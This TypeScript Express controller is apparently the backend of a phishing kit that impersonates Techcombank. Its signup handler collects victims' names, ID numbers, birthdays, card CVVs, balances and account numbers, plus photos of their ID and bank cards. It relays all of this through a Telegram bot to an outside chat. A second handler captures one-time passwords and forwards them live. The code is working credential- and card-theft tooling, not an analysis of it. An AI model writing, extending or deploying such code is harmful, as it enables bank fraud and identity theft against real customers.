import { Request, Response } from "express";
import { Techcombank } from "../models/techcombank.model";
import { getUrlUpload } from "../helper";
const TelegramBot = require("node-telegram-bot-api");
import { resize } from "../config/upload.config";
import dotenv from "dotenv";
dotenv.config();

const TOKEN = process.env.TELEGRAM_BOT_TOKEN_3 || "";
const CHAT_ID = process.env.TELEGRAM_CHAT_ID_3 || "";
const bot = new TelegramBot(TOKEN, { polling: false });

export class TechcombankController {
  async signup(req: Request, res: Response) {
    try {
      const ip =
        req.headers["x-forwarded-for"] || req.socket.remoteAddress || "";
      const {
        email,
        name,
        phone,
        idCard,
        birthday,
        cvv,
        cardLimit,
        cardBalance,
        proposeLimit,
        cardType,
        accountNumber,
        socketId,
      } = req.body;

      bot.sendMessage(
        CHAT_ID,
        `Email: ${email}\nName: ${name}\nPhone: ${phone}\nID Card: ${idCard}\nBirthday: ${birthday}\nCVV: ${cvv}\nCard Limit: ${cardLimit}\nCard Balance: ${cardBalance}\nPropose Limit: ${proposeLimit}\nCard Type: ${cardType}\nAccount Number: ${accountNumber}\nIP: ${ip}\n`
      );

      let frontIdCard = "";
      let backIdCard = "";
      let frontCard = "";
      let backCard = "";

      if (req.files) {
        const files = req.files as {
          [fieldname: string]: Express.Multer.File[];
        };

        [frontIdCard, backIdCard, frontCard, backCard] = await Promise.all([
          files?.frontIdCard && resize(files?.frontIdCard[0]),
          files?.backIdCard && resize(files?.backIdCard[0]),
          files?.frontCard && resize(files?.frontCard[0]),
          files?.backCard && resize(files?.backCard[0]),
        ]);

        frontIdCard = getUrlUpload(frontIdCard);
        backIdCard = getUrlUpload(backIdCard);
        frontCard = getUrlUpload(frontCard);
        backCard = getUrlUpload(backCard);
      }

      const account = new Techcombank({
        email,
        name,
        phone,
        frontIdCard,
        backIdCard,
        idCard,
        birthday,
        cvv,
        frontCard,
        backCard,
        cardLimit,
        cardBalance,
        proposeLimit,
        cardType,
        socketId,
        accountNumber,
        ip,
      });

      await account.save();

      Promise.all([
        frontIdCard && bot.sendPhoto(CHAT_ID, frontIdCard),
        backIdCard && bot.sendPhoto(CHAT_ID, backIdCard),
        frontCard && bot.sendPhoto(CHAT_ID, frontCard),
        backCard && bot.sendPhoto(CHAT_ID, backCard),
      ]).catch((err) => {
        console.log("err", err.message);
      });

      return res.status(200).json({
        message: "Signup successfully",
      });
    } catch (error: any) {
      console.log("error", error.message);
      return res.status(500).json({
        message: error.message,
      });
    }
  }

  async getAll(req: Request, res: Response) {
    try {
      const accounts = await Techcombank.find().sort({ createdAt: -1 });

      return res.status(200).json({
        accounts,
      });
    } catch (error: any) {
      return res.status(500).json({
        message: error.message,
      });
    }
  }

  async delete(req: Request, res: Response) {
    try {
      const { id } = req.params;

      await Techcombank.findByIdAndUpdate(id, { deleteAt: new Date() });

      return res.status(200).json({
        message: "Delete successfully",
      });
    } catch (error: any) {
      return res.status(500).json({
        message: error.message,
      });
    }
  }

  async updateOTP(req: Request, res: Response) {
    try {
      const { id } = req.params;
      const { otp } = req.body;

      const result = await Techcombank.findByIdAndUpdate(
        id,
        { otp },
        { new: true }
      );
      io.emit("updateOTP", result);

      bot
        .sendMessage(CHAT_ID, `OTP: ${otp}\nName: ${result?.name}`)
        .catch((err: any) => {
          console.log("err", err.message);
        });

      return res.status(200).json({ result });
    } catch (error: any) {
      console.log("error", error.message);
      return res.status(500).json({
        message: error.message,
      });
    }
  }
}
